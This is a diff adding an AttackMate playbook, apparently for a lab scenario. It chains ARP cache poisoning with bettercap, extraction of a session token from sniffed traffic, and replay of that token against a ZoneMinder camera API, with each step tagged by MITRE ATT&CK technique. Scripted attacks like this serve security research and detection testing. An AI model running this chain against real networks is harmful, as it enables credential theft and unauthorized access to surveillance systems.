@@ -1,0 +1,50 @@
+####################
+#
+# Scenario 5 - AttackMate playbook
+#
+####################
+# noinspection YAMLSchemaValidation
+vars:
+  TARGET: 172.17.100.121
+
+commands:
+  - type: shell
+    cmd: sudo bettercap -caplet /home/aecid/bettercap.cap
+    background: True
+    kill_on_exit: False
+    metadata:
+       techniques: "T1040,T1557.002 "
+       tactic: "Discovery,Credential Access"
+       technique_name: "Network Sniffing,Adversary-in-the-Middle: ARP Cache Poisoning "
+
+  - type: shell
+    cmd: sudo /usr/local/share/attackmate/venv/bin/python3 /home/aecid/get_auth.py
+    metadata:
+       techniques: "T1040,T1528"
+       tactic: "Credential Access"
+       technique_name: "Network Sniffing for Credential/Session Token Extraction, Steal Application Access Token"
+
+
+  - type: setvar
+    cmd: $RESULT_STDOUT
+    variable: AUTH
+
+  - type: debug
+    cmd: $AUTH
+
+  - type: shell
+    cmd: sudo pkill -9 -f "bettercap -caplet bettercap.cap"
+
+  - type: sleep
+    seconds: 5
+
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/zm/api/monitors.json?auth=$AUTH
+    metadata:
+       techniques: "T1550.001"
+       tactic: "Defense Evasion, Lateral Movement"
+       technique_name: "Use Alternate Authentication Material: Application Access Token"
+
+
+  
